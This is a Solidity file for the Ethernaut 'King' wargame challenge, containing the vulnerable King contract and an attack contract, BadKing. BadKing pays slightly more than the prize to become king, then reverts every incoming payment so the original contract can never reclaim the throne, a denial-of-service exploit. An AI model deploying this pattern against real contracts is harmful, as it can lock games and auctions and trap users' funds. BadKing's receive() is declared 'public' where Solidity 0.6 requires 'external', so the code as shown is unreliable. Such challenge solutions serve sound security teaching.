// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract King {

  address payable king;
  uint public prize;
  address payable public owner;

  constructor() public payable {
    owner = msg.sender;
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    king.transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address payable) {
    return king;
  }
}

contract BadKing {
	// Create constructor with 1 eth
	constructor() public payable {
	}

	// Function to send eth to the contract
	function regicide(address _to) public {
    (bool sent, ) = _to.call{value: 1000000000000001}("");    // Hardcoded .001 ETH (amount set by ethernaut)
    require(sent, "ETH not sent");
	}

	// Bad fallback function which reverts transaction, stops og contract from taking over again
	receive() public payable {
		revert("king is dead");
	}
}
